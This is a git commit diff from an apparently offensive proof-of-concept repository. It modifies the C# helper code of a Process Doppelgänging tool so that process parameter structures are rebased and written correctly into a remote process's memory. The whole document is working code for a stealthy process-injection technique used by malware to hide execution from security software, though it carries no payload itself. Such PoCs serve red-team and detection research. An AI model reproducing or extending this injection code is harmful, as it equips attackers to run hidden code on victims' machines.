9718869d87b7b2ed80f8fbd8f923daabea8fd04f
daem0nc0re <daem0nc0re@outlook.com>
2022-08-23 20:13:09 +0900

    Fixed ntdll!_rtl_user_process_parameters issue for PE Injection PoCs

--- ProcessDoppelgaenging/ProcessDoppelgaenging/Library/Utilities.cs
+++ ProcessDoppelgaenging/ProcessDoppelgaenging/Library/Utilities.cs
@@ -180,75 +180,45 @@ namespace ProcessDoppelgaenging.Library
         public static void RebaseProcessParameters(
             IntPtr pLocalProcessParameters,
             IntPtr pRemoteProcessParameters,
-            bool toLocalPointers)
+            bool toLocalPointers,
+            bool containsEnvironment)
         {
-            long nOffset;
+            ulong nBaseOffset;
+            IntPtr pBasePointer;
+            IntPtr pTempPointer;
+            IntPtr pVerify;
+            IntPtr pOverwrite;
             var processParameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(
                 pLocalProcessParameters,
                 typeof(RTL_USER_PROCESS_PARAMETERS));
-            ulong nSizeBuffer = processParameters.MaximumLength + processParameters.EnvironmentSize;
-            IntPtr pEnvironment = processParameters.Environment;
-            IntPtr pCurdirBuffer = processParameters.CurrentDirectory.DosPath.GetBuffer();
-            IntPtr pDllPathBuffer = processParameters.DllPath.GetBuffer();
-            IntPtr pImagePathNameBuffer = processParameters.ImagePathName.GetBuffer();
-            IntPtr pCommandLineBuffer = processParameters.CommandLine.GetBuffer();
-            IntPtr pWindowTitleBuffer = processParameters.WindowTitle.GetBuffer();
-            IntPtr pDesktopInfoBuffer = processParameters.DesktopInfo.GetBuffer();
-            IntPtr pShellInfoBuffer = processParameters.ShellInfo.GetBuffer();
-            IntPtr pRuntimeDataBuffer = processParameters.RuntimeData.GetBuffer();
-            IntPtr pRedirectionDllNameBuffer = processParameters.RedirectionDllName.GetBuffer();
-            IntPtr pHeapPartitionNameBuffer = processParameters.HeapPartitionName.GetBuffer();
+            ulong nSizeStructure = (ulong)processParameters.MaximumLength;
+            ulong nDataSize = nSizeStructure;
+
+            if (containsEnvironment)
+                nDataSize += processParameters.EnvironmentSize;
 
             if (toLocalPointers)
-                nOffset = pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64();
-            else
-                nOffset = pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64();
-
-            if ((ulong)(pEnvironment.ToInt64() - pLocalProcessParameters.ToInt64()) < nSizeBuffer)
-                processParameters.Environment = new IntPtr(pEnvironment.ToInt64() + nOffset);
-
-            if (pCurdirBuffer != IntPtr.Zero)
-                processParameters.CurrentDirectory.DosPath.SetBuffer(new IntPtr(pCurdirBuffer.ToInt64() + nOffset));
-
-            if (pDllPathBuffer != IntPtr.Zero)
-                processParameters.DllPath.SetBuffer(new IntPtr(pDllPathBuffer.ToInt64() + nOffset));
-
-            if (pImagePathNameBuffer != IntPtr.Zero)
-                processParameters.ImagePathName.SetBuffer(new IntPtr(pImagePathNameBuffer.ToInt64() + nOffset));
-
-            if (pCommandLineBuffer != IntPtr.Zero)
-                processParameters.CommandLine.SetBuffer(new IntPtr(pCommandLineBuffer.ToInt64() + nOffset));
-
-            if (pWindowTitleBuffer != IntPtr.Zero)
-                processParameters.WindowTitle.SetBuffer(new IntPtr(pWindowTitleBuffer.ToInt64() + nOffset));
-
-            if (pDesktopInfoBuffer != IntPtr.Zero)
-                processParameters.DesktopInfo.SetBuffer(new IntPtr(pDesktopInfoBuffer.ToInt64() + nOffset));
-
-            if (pShellInfoBuffer != IntPtr.Zero)
-                processParameters.ShellInfo.SetBuffer(new IntPtr(pShellInfoBuffer.ToInt64() + nOffset));
-
-            if (pRuntimeDataBuffer != IntPtr.Zero)
-                processParameters.RuntimeData.SetBuffer(new IntPtr(pRuntimeDataBuffer.ToInt64() + nOffset));
-
-            if (pRedirectionDllNameBuffer != IntPtr.Zero)
-                processParameters.RedirectionDllName.SetBuffer(new IntPtr(pRedirectionDllNameBuffer.ToInt64() + nOffset));
-
-            if (pHeapPartitionNameBuffer != IntPtr.Zero)
-                processParameters.HeapPartitionName.SetBuffer(new IntPtr(pHeapPartitionNameBuffer.ToInt64() + nOffset));
-
-            for (var idx = 0; idx < 32; idx++)
             {
-                pCurdirBuffer = processParameters.CurrentDirectores[idx].DosPath.GetBuffer();
-
-                if (pCurdirBuffer != IntPtr.Zero)
-                {
-                    processParameters.CurrentDirectores[idx].DosPath.SetBuffer(
-                        new IntPtr(pCurdirBuffer.ToInt64() + nOffset));
-                }
+                pBasePointer = pRemoteProcessParameters;
+                nBaseOffset = (ulong)(pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64());
+            }
+            else
+            {
+                pBasePointer = pLocalProcessParameters;
+                nBaseOffset = (ulong)(pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64());
             }
 
-            Marshal.StructureToPtr(processParameters, pLocalProcessParameters, true);
+            for (int nPosition = 0; nPosition < (int)nSizeStructure; nPosition += IntPtr.Size)
+            {
+                pTempPointer = new IntPtr(pLocalProcessParameters.ToInt64() + nPosition);
+                pVerify = Marshal.ReadIntPtr(pTempPointer);
+
+                if ((ulong)(pVerify.ToInt64() - pBasePointer.ToInt64()) < nDataSize)
+                {
+                    pOverwrite = new IntPtr(pVerify.ToInt64() + (long)nBaseOffset);
+                    Marshal.WriteIntPtr(pTempPointer, pOverwrite);
+                }
+            }
         }
 
 
@@ -264,15 +234,13 @@ namespace ProcessDoppelgaenging.Library
             IntPtr pPeb;
             IntPtr pRemoteProcessParametersPointer;
             IntPtr pRemoteProcessParameters;
-            IntPtr pRemoteEnvironment;
-            IntPtr pLocalEnvironmentPointer;
             IntPtr pDataBuffer;
             int nSizeParameters;
             int nSizeEnvironment;
             int nSizeBuffer;
             int nOffsetProcessParameters;
-            int nOffsetEnvironment;
             int nOffsetEnvironmentSize;
+            int nPageOffset;
             string winDir = Environment.GetEnvironmentVariable("windir");
             var unicodeImagePathName = new UNICODE_STRING(imagePathName);
             var unicodeCommandline = new UNICODE_STRING(commandLine);
@@ -286,9 +254,6 @@ namespace ProcessDoppelgaenging.Library
             if (pPeb == IntPtr.Zero)
                 return IntPtr.Zero;
 
-            nOffsetEnvironment = Marshal.OffsetOf(
-                typeof(RTL_USER_PROCESS_PARAMETERS),
-                "Environment").ToInt32();
             nOffsetEnvironmentSize = Marshal.OffsetOf(
                     typeof(RTL_USER_PROCESS_PARAMETERS),
                     "EnvironmentSize").ToInt32();
@@ -335,15 +300,17 @@ namespace ProcessDoppelgaenging.Library
             if (ntstatus != Win32Consts.STATUS_SUCCESS)
                 return IntPtr.Zero;
 
+            nPageOffset = (int)(pLocalProcessParameters.ToInt64() - (pLocalProcessParameters.ToInt64() & ~(0xFFF)));
             nSizeParameters = Marshal.ReadInt32(pLocalProcessParameters); // MaxLength
             nSizeEnvironment = (int)Marshal.ReadInt64(new IntPtr(
                 pLocalProcessParameters.ToInt64() +
                 nOffsetEnvironmentSize));
             nSizeBuffer = nSizeParameters + nSizeEnvironment;
+
             pRemoteProcessParameters = Helpers.AllocateReadWriteMemory(
                 hProcess,
                 IntPtr.Zero,
-                (uint)nSizeBuffer);
+                (uint)(nSizeBuffer + 0x1000));
 
             if (pRemoteProcessParameters == IntPtr.Zero)
             {
@@ -352,17 +319,13 @@ namespace ProcessDoppelgaenging.Library
                 return IntPtr.Zero;
             }
 
-            pRemoteEnvironment = new IntPtr(
-                pRemoteProcessParameters.ToInt64() +
-                nSizeParameters);
-            pLocalEnvironmentPointer = new IntPtr(
-                pLocalProcessParameters.ToInt64() +
-                nOffsetEnvironment);
+            pRemoteProcessParameters = new IntPtr(pRemoteProcessParameters.ToInt64() + nPageOffset);
+
             RebaseProcessParameters(
                 pLocalProcessParameters,
                 pRemoteProcessParameters,
-                false);
-            Marshal.WriteIntPtr(pLocalEnvironmentPointer, pRemoteEnvironment);
+                false,
+                true);
 
             status = Helpers.WriteMemory(
                 hProcess,
